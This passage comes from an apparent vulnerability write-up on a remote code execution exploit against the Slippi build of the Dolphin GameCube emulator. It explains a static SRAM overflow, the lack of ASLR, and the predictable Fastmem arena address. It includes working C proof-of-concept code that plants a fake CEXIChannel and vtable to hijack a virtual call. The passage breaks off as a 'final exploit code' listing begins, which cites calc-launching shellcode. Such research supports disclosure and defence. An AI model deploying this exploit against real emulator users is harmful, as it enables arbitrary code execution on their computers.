+<span class=giallo-l><span>};</span></span></code></pre><p>And <code>g_SRAM</code> is defined as a global variable near the top of <code>EXI.cpp</code>, making this a static memory overflow:<pre class=giallo style=color:#e6e6e6;background-color:#222><code data-lang=cpp><span class=giallo-l><span style=color:#6a9955>// Copyright 2008 Dolphin Emulator Project</span></span>
+<span class=giallo-l><span style=color:#6a9955>// Licensed under GPLv2+</span></span>
+<span class=giallo-l><span style=color:#6a9955>// Refer to the license.txt file included.</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#6a9955>// ...</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>SRAM g_SRAM;</span></span>
+<span class=giallo-l><span style=color:#569cd6>bool</span><span> g_SRAM_netplay_initialized </span><span style=color:#d4d4d4>=</span><span style=color:#569cd6> false</span><span>;</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#569cd6>namespace</span><span> ExpansionInterface</span></span>
+<span class=giallo-l><span>{</span></span>
+<span class=giallo-l><span style=color:#6a9955>// ...</span></span></code></pre><p>Looking at a locally compiled build of Slippi Dolphin, these are the fields immediately following <code>g_SRAM</code>:<pre class=c41>
+<code class="c1 c41" style=white-space:pre;font-family:monospace><span class=c46>.data:0000000001BD7E30 </span><span class=c3>; SRAM g_SRAM
+</span><span class=c46>.data:0000000001BD7E30 </span><span class=c7>?g_SRAM@@3TSRAM@@A SRAM &lt;</span><span class=c9>?>             </span><span class=c15>; DATA XREF: Header::Header(int,ushort,bool)+46↑o
+</span><span class=c46>.data:0000000001BD7E30                                         </span><span class=c15>; NetPlayServer::OnConnect(_ENetPeer *)+3E4↑o ...
+</span><span class=c46>.data:0000000001BD7E70 </span><span class=c3>; bool g_SRAM_netplay_initialized
+</span><span class=c46>.data:0000000001BD7E70 </span><span class=c7>?g_SRAM_netplay_initialized@@3_NA </span><span class=c32>db </span><span class=c9>?  </span><span class=c15>; DATA XREF: ExpansionInterface::Init(void)+1F↑r
+</span><span class=c46>.data:0000000001BD7E70                                         </span><span class=c15>; NetPlayServer::OnConnect(_ENetPeer *)+380↑r ...
+</span><span class=c46>.data:0000000001BD7E71                 </span><span class=c32>align </span><span class=c31>8
+</span><span class=c46>.data:0000000001BD7E78 </span><span class=c3>; std::map&lt;int,std::string> quickChatOptions_103
+</span><span class=c46>.data:0000000001BD7E78 </span><span class=c7>quickChatOptions_103 std::map&lt;int,std::basic_string&lt;char,std::char_traits&lt;char>,std::allocator&lt;char> >,std::less&lt;int>,std::allocator&lt;std::pair&lt;int const ,std::basic_string&lt;char,std::char_traits&lt;char>,std::allocator&lt;char> > > > > &lt;</span><span class=c9>?>
+</span><span class=c46>.data:0000000001BD7E78                                         </span><span class=c15>; DATA XREF: _dynamic_initializer_for__quickChatOptions___103+81↑w
+</span><span class=c46>.data:0000000001BD7E78                                         </span><span class=c15>; _dynamic_initializer_for__quickChatOptions___103+AD↑w ...
+</span><span class=c46>.data:0000000001BD7E88 </span><span class=c3>; CoreTiming::EventType *ExpansionInterface::changeDevice
+</span><span class=c46>.data:0000000001BD7E88 </span><span class=c7>ExpansionInterface__changeDevice </span><span class=c32>dq </span><span class=c9>?   </span><span class=c15>; DATA XREF: ExpansionInterface::ChangeDevice(uchar,TEXIDevices,uchar)+24↑r
+</span><span class=c46>.data:0000000001BD7E88                                         </span><span class=c15>; ExpansionInterface::ChangeDevice(uchar,TEXIDevices,uchar)+43↑r ...
+</span><span class=c46>.data:0000000001BD7E90 </span><span class=c3>; CoreTiming::EventType *ExpansionInterface::updateInterrupts
+</span><span class=c46>.data:0000000001BD7E90 </span><span class=c7>ExpansionInterface__updateInterrupts </span><span class=c32>dq </span><span class=c9>?
+</span><span class=c46>.data:0000000001BD7E90                                         </span><span class=c15>; DATA XREF: ExpansionInterface::Init(void)+25B↑w
+</span><span class=c46>.data:0000000001BD7E90                                         </span><span class=c15>; ExpansionInterface::ScheduleUpdateInterrupts(CoreTiming::FromThread,int)+9↑r
+</span><span class=c46>.data:0000000001BD7E98 </span><span class=c3>; std::array&lt;std::unique_ptr&lt;CEXIChannel>,3> ExpansionInterface::g_Channels
+</span><span class=c46>.data:0000000001BD7E98 </span><span class=c7>ExpansionInterface__g_Channels std::array&lt;std::unique_ptr&lt;CEXIChannel,std::default_delete&lt;CEXIChannel> >,3> &lt;</span><span class=c9>?>
+</span><span class=c46>.data:0000000001BD7E98                                         </span><span class=c15>; DATA XREF: ExpansionInterface__ChangeDeviceCallback+20↑o
+</span><span class=c46>.data:0000000001BD7E98                                         </span><span class=c15>; ExpansionInterface::DoState(PointerWrap &)+12↑o ...</span>
+</code><style>.c1{color:#aaa}.c41{background-color:#2d2d2d}.c46{color:#7c7c61}.c3{color:#82607e}.c7{color:#ebebb9}.c9{color:silver}.c32{color:#ababab}.c15{color:#7c7c61}.c31{color:#d25032}</style></pre><p><code>quickChatOptions</code> doesn't appear to be a good corruption target since there wouldn't be any function pointers to mess with, and it's only used by a config menu that isn't even accessible in Playback builds. <code>ExpansionInterface::changeDevice</code> is a callback, which seems more promising, but it only gets called when an EXI device gets changed during emulation, which can only happen from the user messing with config menus or savestates. <code>updateInterrupts</code> is also a callback, but that only gets called from ethernet or microphone EXI devices, neither of which are enabled by default.<p>Finally, this leaves <code>ExpansionInterface::g_Channels</code>. <code>CEXIChannel</code> doesn't contain any function pointers on its own, but it does contain pointers to <code>IEXIDevice</code> objects, which have plenty of virtual functions to overwrite.<pre class=giallo style=color:#e6e6e6;background-color:#222><code data-lang=cpp><span class=giallo-l><span style=color:#6a9955>// Devices</span></span>
+<span class=giallo-l><span style=color:#569cd6>enum</span></span>
+<span class=giallo-l><span>{</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>    NUM_DEVICES</span><span style=color:#d4d4d4> =</span><span style=color:#b5cea8> 3</span></span>
+<span class=giallo-l><span>};</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>std::array</span><span style=color:#d4d4d4>&lt;</span><span>std::unique_ptr</span><span style=color:#d4d4d4>&lt;</span><span>IEXIDevice</span><span style=color:#d4d4d4>></span><span>, NUM_DEVICES</span><span style=color:#d4d4d4>></span><span> m_devices;</span></span></code></pre><p>So, the plan here is to create a fake <code>CEXIChannel</code> populated with fake <code>IEXIDevice</code> objects with virtual functions that point to a ROP chain. Though, I'll have to figure out how to get the base addresses of both the main executable and the emulated main RAM before I can do any of that. It would be really nice if I didn't have to deal with leaking addresses, though...<p>Who am I kidding? This version of Dolphin is 64-bit and gets compiled with Visual Studio 2019. Obviously, there's gonna be ASLR! Still, I guess it doesn't hurt to check.<p><img alt src=/img/slippirce/lolnoaslr.png><p>It turns out that Dolphin didn't have ASLR since a <a href=https://github.com/dolphin-emu/dolphin/commit/ccd30024b30c71743a2c588ccfd748d017a099da#diff-e82c532fb1e912b5e01b59a2b66cf2febaac9c690b7b4de3f78482b8a59ced80 rel=external>VS2013 update in 2013</a> and didn't get it back until <a href=https://github.com/dolphin-emu/dolphin/pull/5271 rel=external>June 2017</a>. The last time Faster Melee synced with Ishiiruka was about a month after this pull request got merged, but they synced it with its "Stable" branch, which didn't have this commit in it. Ouch!<p><img alt src=/img/slippirce/lolyesaslr.png><p>Anyway, I still need to find where the emulated main RAM is in memory to do anything useful, so let's see how I can get that.<p>Dolphin uses a very interesting method of ensuring that its emulated memory accesses are as fast as possible. Traditionally, given a hardcoded address map, an emulator would manually check the ranges on each memory access to see which region of memory it should go to. Doing this for every single memory access is quite slow, so Dolphin's developers came up with a trick called "Fastmem".<p>First, a massive 16GB region of address space is reserved <em>(not allocated!)</em>. This doesn't give it any backing memory, but just reserves that part of the address space for use later.<pre class=giallo style=color:#e6e6e6;background-color:#222><code data-lang=cpp><span class=giallo-l><span style=color:#4ec9b0>u8</span><span style=color:#569cd6>*</span><span> MemArena::</span><span style=color:#dcdcaa>FindMemoryBase</span><span>()</span></span>
+<span class=giallo-l><span>{</span></span>
+<span class=giallo-l><span style=color:#6a9955>    // Non-Win64 omitted</span></span>
+<span class=giallo-l><span>    u8</span><span style=color:#d4d4d4>*</span><span> base </span><span style=color:#d4d4d4>=</span><span> (u8</span><span style=color:#d4d4d4>*</span><span>)</span><span style=color:#dcdcaa>VirtualAlloc</span><span>(</span><span style=color:#b5cea8>0</span><span>,</span><span style=color:#b5cea8> 0x400000000</span><span>, MEM_RESERVE, PAGE_READWRITE);</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    VirtualFree</span><span>(base,</span><span style=color:#b5cea8> 0</span><span>, MEM_RELEASE);</span></span>
+<span class=giallo-l><span style=color:#c586c0>    return</span><span> base;</span></span>
+<span class=giallo-l><span>}</span></span></code></pre><p>Then, parts of that reserved region are carved out and allocated for the regions with backing memory.<pre class=giallo style=color:#e6e6e6;background-color:#222><code data-lang=cpp><span class=giallo-l><span style=color:#569cd6>static bool</span><span style=color:#dcdcaa> Memory_TryBase</span><span>(</span><span style=color:#4ec9b0>u8</span><span style=color:#569cd6>*</span><span style=color:#9cdcfe> base</span><span>,</span><span style=color:#4ec9b0> MemoryView</span><span style=color:#569cd6>*</span><span style=color:#9cdcfe> views</span><span>,</span><span style=color:#569cd6> int</span><span style=color:#9cdcfe> num_views</span><span>,</span><span style=color:#4ec9b0> u32</span><span style=color:#9cdcfe> flags</span><span>,</span><span style=color:#4ec9b0> MemArena</span><span style=color:#569cd6>*</span><span style=color:#9cdcfe> arena</span><span>)</span></span>
+<span class=giallo-l><span>{</span></span>
+<span class=giallo-l><span style=color:#6a9955>    // OK, we know where to find free space. Now grab it!</span></span>
+<span class=giallo-l><span style=color:#6a9955>    // We just mimic the popular BAT setup.</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#569cd6>    int</span><span> i;</span></span>
+<span class=giallo-l><span style=color:#c586c0>    for</span><span> (i </span><span style=color:#d4d4d4>=</span><span style=color:#b5cea8> 0</span><span>; i </span><span style=color:#d4d4d4>&lt;</span><span> num_views; i</span><span style=color:#d4d4d4>++</span><span>)</span></span>
+<span class=giallo-l><span>    {</span></span>
+<span class=giallo-l><span>        MemoryView</span><span style=color:#d4d4d4>*</span><span> view </span><span style=color:#d4d4d4>= &</span><span style=color:#9cdcfe>views</span><span>[i];</span></span>
+<span class=giallo-l><span style=color:#569cd6>        void</span><span style=color:#d4d4d4>*</span><span> view_base;</span></span>
+<span class=giallo-l><span style=color:#569cd6>        bool</span><span> use_sw_mirror;</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#dcdcaa>        SKIP</span><span>(flags,</span><span style=color:#9cdcfe> view</span><span>-></span><span style=color:#9cdcfe>flags</span><span>);</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#c586c0>#if</span><span style=color:#dcdcaa> _ARCH_64</span></span>
+<span class=giallo-l><span style=color:#6a9955>        // On 64-bit, we map the same file position multiple times, so we</span></span>
+<span class=giallo-l><span style=color:#6a9955>        // don't need the software fallback for the mirrors.</span></span>
+<span class=giallo-l><span>        view_base </span><span style=color:#d4d4d4>=</span><span> base </span><span style=color:#d4d4d4>+</span><span style=color:#9cdcfe> view</span><span>-></span><span style=color:#9cdcfe>virtual_address</span><span>;</span></span>
+<span class=giallo-l><span>        use_sw_mirror </span><span style=color:#d4d4d4>=</span><span style=color:#569cd6> false</span><span>;</span></span>
+<span class=giallo-l><span style=color:#c586c0>#else</span></span>
+<span class=giallo-l><span style=color:#6a9955>        // On 32-bit, we don't have the actual address space to store all</span></span>
+<span class=giallo-l><span style=color:#6a9955>        // the mirrors, so we just map the fallbacks somewhere in our address</span></span>
+<span class=giallo-l><span style=color:#6a9955>        // space and use the software fallbacks for mirroring.</span></span>
+<span class=giallo-l><span>        view_base </span><span style=color:#d4d4d4>=</span><span> base </span><span style=color:#d4d4d4>+</span><span> (</span><span style=color:#9cdcfe>view</span><span>-></span><span style=color:#9cdcfe>virtual_address</span><span style=color:#d4d4d4> &</span><span style=color:#b5cea8> 0x3FFFFFFF</span><span>);</span></span>
+<span class=giallo-l><span>        use_sw_mirror </span><span style=color:#d4d4d4>=</span><span style=color:#569cd6> true</span><span>;</span></span>
+<span class=giallo-l><span style=color:#c586c0>#endif</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#c586c0>        if</span><span> (use_sw_mirror </span><span style=color:#d4d4d4>&&</span><span> (</span><span style=color:#9cdcfe>view</span><span>-></span><span style=color:#9cdcfe>flags</span><span style=color:#d4d4d4> &</span><span> MV_MIRROR_PREVIOUS))</span></span>
+<span class=giallo-l><span>        {</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>            view</span><span>-></span><span style=color:#9cdcfe>view_ptr</span><span style=color:#d4d4d4> =</span><span style=color:#9cdcfe> views</span><span>[i </span><span style=color:#d4d4d4>-</span><span style=color:#b5cea8> 1</span><span>].</span><span style=color:#9cdcfe>view_ptr</span><span>;</span></span>
+<span class=giallo-l><span>        }</span></span>
+<span class=giallo-l><span style=color:#c586c0>        else</span></span>
+<span class=giallo-l><span>        {</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>            view</span><span>-></span><span style=color:#9cdcfe>mapped_ptr</span><span style=color:#d4d4d4> =</span><span style=color:#9cdcfe> arena</span><span>-></span><span style=color:#dcdcaa>CreateView</span><span>(</span><span style=color:#9cdcfe>view</span><span>-></span><span style=color:#9cdcfe>shm_position</span><span>,</span><span style=color:#9cdcfe> view</span><span>-></span><span style=color:#9cdcfe>size</span><span>, view_base);</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>            view</span><span>-></span><span style=color:#9cdcfe>view_ptr</span><span style=color:#d4d4d4> =</span><span style=color:#9cdcfe> view</span><span>-></span><span style=color:#9cdcfe>mapped_ptr</span><span>;</span></span>
+<span class=giallo-l><span>        }</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#c586c0>        if</span><span> (</span><span style=color:#d4d4d4>!</span><span style=color:#9cdcfe>view</span><span>-></span><span style=color:#9cdcfe>view_ptr</span><span>)</span></span>
+<span class=giallo-l><span>        {</span></span>
+<span class=giallo-l><span style=color:#6a9955>            // Argh! ERROR! Free what we grabbed so far so we can try again.</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>            MemoryMap_Shutdown</span><span>(views, i </span><span style=color:#d4d4d4>+</span><span style=color:#b5cea8> 1</span><span>, flags, arena);</span></span>
+<span class=giallo-l><span style=color:#c586c0>            return</span><span style=color:#569cd6> false</span><span>;</span></span>
+<span class=giallo-l><span>        }</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#c586c0>        if</span><span> (</span><span style=color:#9cdcfe>view</span><span>-></span><span style=color:#9cdcfe>out_ptr</span><span>)</span></span>
+<span class=giallo-l><span style=color:#d4d4d4>            *</span><span>(</span><span style=color:#9cdcfe>view</span><span>-></span><span style=color:#9cdcfe>out_ptr</span><span>)</span><span style=color:#d4d4d4> =</span><span> (u8</span><span style=color:#d4d4d4>*</span><span>)</span><span style=color:#9cdcfe>view</span><span>-></span><span style=color:#9cdcfe>view_ptr</span><span>;</span></span>
+<span class=giallo-l><span>    }</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#c586c0>    return</span><span style=color:#569cd6> true</span><span>;</span></span>
+<span class=giallo-l><span>}</span></span></code></pre><p>Since that massive reserved block can fit the whole 32-bit address space <em>(4GB for address translation off, 4GB for it on, and 4GB + 4GB of unmapped padding after them just in case)</em>, the JIT can then (ab)use the host's MMU to automatically translate addresses to the right place by using that region as a base for a 32-bit offset. If any memory access hits unmapped host memory (e.g., MMIO) within that region, the JIT goes and patches the memory access to use the slower method and tries again. Since most memory accesses only access main RAM, this is a net win!<p>Fastmem is a really cool optimization, but how does that help with the exploit? Well, despite having a whole 48 bits of address space to work with, Windows only ever seems to try to reserve that massive chunk of memory at the lowest address it can. There isn't a whole lot allocated by Dolphin or any of its libraries before booting a game, so there isn't much fragmentation in the address space. Near the top of that 32-bit address space is <a href=https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/ns-ntddk-kuser_shared_data rel=external><code>KUSER_SHARED_DATA</code></a>, which is always at <code>0x7FFEF000</code> no matter what. There's a massive gap in address space between the end of <code>KUSER_SHARED_DATA</code> and the DLLs that get loaded in the <code>0x007FF...</code> range due to ASLR, so where does Windows put the Fastmem arena?<p><img alt src=/img/slippirce/fastmem.png><p>Right after <code>KUSER_SHARED_DATA</code> at <code>0x7FFFF000</code> every single time, of course! This isn't a fluke; it really is this consistent on all of the PCs I've tested.<p>Now that I know that I don't need any leaks, let's start poking around with this fake <code>CEXIChannel</code>.<pre class=giallo style=color:#e6e6e6;background-color:#222><code data-lang=c><span class=giallo-l><span style=color:#c586c0>#include</span><span style=color:#ce9178> &lt;string.h></span></span>
+<span class=giallo-l><span style=color:#c586c0>#include</span><span style=color:#ce9178> &lt;gccore.h></span></span>
+<span class=giallo-l><span style=color:#c586c0>#include</span><span style=color:#ce9178> &lt;ogc/machine/processor.h></span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#6a9955>// Adapted from internal libogc code</span></span>
+<span class=giallo-l><span style=color:#569cd6>static void</span><span style=color:#dcdcaa> __sram_write</span><span>(</span><span style=color:#569cd6>void</span><span style=color:#d4d4d4> *</span><span style=color:#9cdcfe>buffer</span><span>, u32 </span><span style=color:#9cdcfe>size</span><span>) {</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    EXI_Lock</span><span>(EXI_CHANNEL_0, EXI_DEVICE_1,</span><span style=color:#569cd6> NULL</span><span>);</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    EXI_Select</span><span>(EXI_CHANNEL_0, EXI_DEVICE_1, EXI_SPEED8MHZ);</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>    u32 cmd </span><span style=color:#d4d4d4>=</span><span style=color:#b5cea8> 0xA0000100</span><span>;</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    EXI_Imm</span><span>(EXI_CHANNEL_0,</span><span style=color:#d4d4d4> &</span><span>cmd,</span><span style=color:#b5cea8> 4</span><span>, EXI_WRITE,</span><span style=color:#569cd6> NULL</span><span>);</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    EXI_Sync</span><span>(EXI_CHANNEL_0);</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    EXI_Dma</span><span>(EXI_CHANNEL_0, buffer, size, EXI_WRITE,</span><span style=color:#569cd6> NULL</span><span>);</span></span>
+<span class=giallo-l><span>}</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#569cd6>typedef struct</span><span> {</span></span>
+<span class=giallo-l><span>    u8 </span><span style=color:#9cdcfe>gap0</span><span>[</span><span style=color:#b5cea8>0x18</span><span>];</span></span>
+<span class=giallo-l><span>    u64 </span><span style=color:#9cdcfe>m_devices</span><span>[</span><span style=color:#b5cea8>3</span><span>];</span><span style=color:#6a9955> // IEXIDevice*[3]</span></span>
+<span class=giallo-l><span>    u8 </span><span style=color:#9cdcfe>gap30</span><span>[</span><span style=color:#b5cea8>0x8</span><span>];</span></span>
+<span class=giallo-l><span>} CEXIChannel;</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>static_assert</span><span>(</span><span style=color:#569cd6>sizeof</span><span>(CEXIChannel)</span><span style=color:#d4d4d4> ==</span><span style=color:#b5cea8> 0x38</span><span>);</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#c586c0>#define</span><span style=color:#dcdcaa> RAM_BASE</span><span style=color:#b5cea8> 0x7FFF0000uL</span></span>
+<span class=giallo-l><span style=color:#c586c0>#define</span><span style=color:#dcdcaa> TARGET_PTR_OFFSET</span><span style=color:#b5cea8> 0x58</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#569cd6>static</span><span> u64 </span><span style=color:#dcdcaa>guest_to_host_addr</span><span>(</span><span style=color:#569cd6>const void</span><span style=color:#d4d4d4>*</span><span style=color:#9cdcfe> input</span><span>) {</span></span>
+<span class=giallo-l><span style=color:#c586c0>    return</span><span> RAM_BASE </span><span style=color:#d4d4d4>+</span><span> ((u32)input </span><span style=color:#d4d4d4>&</span><span style=color:#b5cea8> 0x7FFFFFFF</span><span>);</span></span>
+<span class=giallo-l><span>}</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#569cd6>int</span><span style=color:#dcdcaa> main</span><span>() {</span></span>
+<span class=giallo-l><span>    u8 </span><span style=color:#9cdcfe>fake_vtbl</span><span>[</span><span style=color:#b5cea8>256</span><span>];</span></span>
+<span class=giallo-l><span style=color:#c586c0>    for</span><span> (</span><span style=color:#569cd6>int</span><span> i </span><span style=color:#d4d4d4>=</span><span style=color:#b5cea8> 0</span><span>; i </span><span style=color:#d4d4d4>&lt;</span><span style=color:#b5cea8> 256</span><span>; i</span><span style=color:#d4d4d4>++</span><span>)</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>        fake_vtbl</span><span>[i]</span><span style=color:#d4d4d4> =</span><span> i;</span></span>
+<span class=giallo-l><span>    </span></span>
+<span class=giallo-l><span style=color:#6a9955>    // Addresses have to be byteswapped because PowerPC is big endian</span></span>
+<span class=giallo-l><span>    u64 fake_device </span><span style=color:#d4d4d4>=</span><span style=color:#dcdcaa> bswap64</span><span>(</span><span style=color:#dcdcaa>guest_to_host_addr</span><span>(</span><span style=color:#d4d4d4>&</span><span>fake_vtbl));</span></span>
+<span class=giallo-l><span>    </span></span>
+<span class=giallo-l><span>    CEXIChannel fake_channel;</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    memset</span><span>(</span><span style=color:#d4d4d4>&</span><span>fake_channel,</span><span style=color:#b5cea8> 0x99</span><span>,</span><span style=color:#569cd6> sizeof</span><span>(fake_channel));</span></span>
+<span class=giallo-l><span style=color:#c586c0>    for</span><span> (</span><span style=color:#569cd6>int</span><span> i </span><span style=color:#d4d4d4>=</span><span style=color:#b5cea8> 0</span><span>; i </span><span style=color:#d4d4d4>&lt;</span><span style=color:#b5cea8> 3</span><span>; i</span><span style=color:#d4d4d4>++</span><span>)</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>        fake_channel</span><span>.</span><span style=color:#9cdcfe>m_devices</span><span>[i]</span><span style=color:#d4d4d4> =</span><span style=color:#dcdcaa> bswap64</span><span>(</span><span style=color:#dcdcaa>guest_to_host_addr</span><span>(</span><span style=color:#d4d4d4>&</span><span>fake_device));</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#6a9955>    // Overwrites g_Channels[0]</span></span>
+<span class=giallo-l><span style=color:#569cd6>    static char</span><span style=color:#9cdcfe> buf</span><span>[TARGET_PTR_OFFSET </span><span style=color:#d4d4d4>+</span><span style=color:#b5cea8> 8</span><span>];</span></span>
+<span class=giallo-l><span>    u64 ptr </span><span style=color:#d4d4d4>=</span><span style=color:#dcdcaa> bswap64</span><span>(</span><span style=color:#dcdcaa>guest_to_host_addr</span><span>(</span><span style=color:#d4d4d4>&</span><span>fake_channel));</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    memcpy</span><span>(buf </span><span style=color:#d4d4d4>+</span><span> TARGET_PTR_OFFSET,</span><span style=color:#d4d4d4> &</span><span>ptr,</span><span style=color:#569cd6> sizeof</span><span>(ptr));</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    __sram_write</span><span>(buf,</span><span style=color:#569cd6> sizeof</span><span>(buf));</span></span>
+<span class=giallo-l><span>}</span></span></code></pre><p>Running this shows that there's a trivially controllable virtual call. Nice!<p><img alt src=/img/slippirce/vtblcheck.png><p>Specifically, this is happening in <code>ExpansionInterface::UpdateInterrupts()</code>, which gets called immediately after the broken DMA transfer completes. <code>IsInterruptSet</code> is the controllable virtual call on the fake <code>IEXIDevice</code> object.<pre class=giallo style=color:#e6e6e6;background-color:#222><code data-lang=cpp><span class=giallo-l><span style=color:#569cd6>void</span><span style=color:#dcdcaa> UpdateInterrupts</span><span>()</span></span>
+<span class=giallo-l><span>{</span></span>
+<span class=giallo-l><span style=color:#6a9955>	// Interrupts are mapped a bit strangely:</span></span>
+<span class=giallo-l><span style=color:#6a9955>	// Channel 0 Device 0 generates interrupt on channel 0</span></span>
+<span class=giallo-l><span style=color:#6a9955>	// Channel 0 Device 2 generates interrupt on channel 2</span></span>
+<span class=giallo-l><span style=color:#6a9955>	// Channel 1 Device 0 generates interrupt on channel 1</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>	g_Channels</span><span>[</span><span style=color:#b5cea8>2</span><span>]-></span><span style=color:#dcdcaa>SetEXIINT</span><span>(</span><span style=color:#9cdcfe>g_Channels</span><span>[</span><span style=color:#b5cea8>0</span><span>]-></span><span style=color:#dcdcaa>GetDevice</span><span>(</span><span style=color:#b5cea8>4</span><span>)-></span><span style=color:#dcdcaa>IsInterruptSet</span><span>());</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#569cd6>	bool</span><span> causeInt </span><span style=color:#d4d4d4>=</span><span style=color:#569cd6> false</span><span>;</span></span>
+<span class=giallo-l><span style=color:#c586c0>	for</span><span> (</span><span style=color:#569cd6>auto</span><span style=color:#d4d4d4>&</span><span> channel : g_Channels)</span></span>
+<span class=giallo-l><span>		causeInt </span><span style=color:#d4d4d4>|=</span><span style=color:#9cdcfe> channel</span><span>-></span><span style=color:#dcdcaa>IsCausingInterrupt</span><span>();</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>	ProcessorInterface::</span><span style=color:#dcdcaa>SetInterrupt</span><span>(ProcessorInterface::INT_CAUSE_EXI, causeInt);</span></span>
+<span class=giallo-l><span>}</span></span></code></pre><p>I'm not going to go through the whole process of how I wrote the ROP chain for this since that isn't very interesting, but here's the final exploit code:<pre class=giallo style=color:#e6e6e6;background-color:#222><code data-lang=cpp><span class=giallo-l><span style=color:#c586c0>#include</span><span style=color:#ce9178> &lt;string.h></span></span>
+<span class=giallo-l><span style=color:#c586c0>#include</span><span style=color:#ce9178> &lt;gccore.h></span></span>
+<span class=giallo-l><span style=color:#c586c0>#include</span><span style=color:#ce9178> &lt;ogc/machine/processor.h></span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#6a9955>// Adapted from internal libogc code</span></span>
+<span class=giallo-l><span style=color:#569cd6>static void</span><span style=color:#dcdcaa> __sram_write</span><span>(</span><span style=color:#569cd6>void *</span><span style=color:#9cdcfe>buffer</span><span>,</span><span style=color:#4ec9b0> u32</span><span style=color:#9cdcfe> size</span><span>) {</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    EXI_Lock</span><span>(EXI_CHANNEL_0, EXI_DEVICE_1,</span><span style=color:#569cd6> NULL</span><span>);</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    EXI_Select</span><span>(EXI_CHANNEL_0, EXI_DEVICE_1, EXI_SPEED8MHZ);</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>    u32 cmd </span><span style=color:#d4d4d4>=</span><span style=color:#b5cea8> 0xA0000100</span><span>;</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    EXI_Imm</span><span>(EXI_CHANNEL_0,</span><span style=color:#d4d4d4> &</span><span>cmd,</span><span style=color:#b5cea8> 4</span><span>, EXI_WRITE,</span><span style=color:#569cd6> NULL</span><span>);</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    EXI_Sync</span><span>(EXI_CHANNEL_0);</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    EXI_Dma</span><span>(EXI_CHANNEL_0, buffer, size, EXI_WRITE,</span><span style=color:#569cd6> NULL</span><span>);</span></span>
+<span class=giallo-l><span>}</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#569cd6>typedef struct</span><span> {</span></span>
+<span class=giallo-l><span>    u8 </span><span style=color:#9cdcfe>gap0</span><span>[</span><span style=color:#b5cea8>0x18</span><span>];</span></span>
+<span class=giallo-l><span>    u64 </span><span style=color:#9cdcfe>m_devices</span><span>[</span><span style=color:#b5cea8>3</span><span>];</span><span style=color:#6a9955> // IEXIDevice*[3]</span></span>
+<span class=giallo-l><span>    u8 </span><span style=color:#9cdcfe>gap30</span><span>[</span><span style=color:#b5cea8>0x8</span><span>];</span></span>
+<span class=giallo-l><span>}</span><span style=color:#4ec9b0> CEXIChannel</span><span>;</span></span>
+<span class=giallo-l><span style=color:#569cd6>static_assert</span><span>(</span><span style=color:#569cd6>sizeof</span><span>(CEXIChannel)</span><span style=color:#d4d4d4> ==</span><span style=color:#b5cea8> 0x38</span><span>);</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#c586c0>#define</span><span style=color:#dcdcaa> RAM_BASE</span><span style=color:#b5cea8> 0x7FFF0000uL</span></span>
+<span class=giallo-l><span style=color:#c586c0>#define</span><span style=color:#dcdcaa> TARGET_PTR_OFFSET</span><span style=color:#b5cea8> 0x58</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#569cd6>static</span><span style=color:#4ec9b0> u64</span><span style=color:#dcdcaa> guest_to_host_addr</span><span>(</span><span style=color:#569cd6>const void*</span><span style=color:#9cdcfe> input</span><span>) {</span></span>
+<span class=giallo-l><span style=color:#c586c0>    return</span><span> RAM_BASE </span><span style=color:#d4d4d4>+</span><span> ((u32)input </span><span style=color:#d4d4d4>&</span><span style=color:#b5cea8> 0x7FFFFFFF</span><span>);</span></span>
+<span class=giallo-l><span>}</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#6a9955>// Don't feel like writing my own calc shellcode for this</span></span>
+<span class=giallo-l><span style=color:#6a9955>// https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode/blob/main/win-x64-DynamicKernelWinExecCalc.asm</span></span>
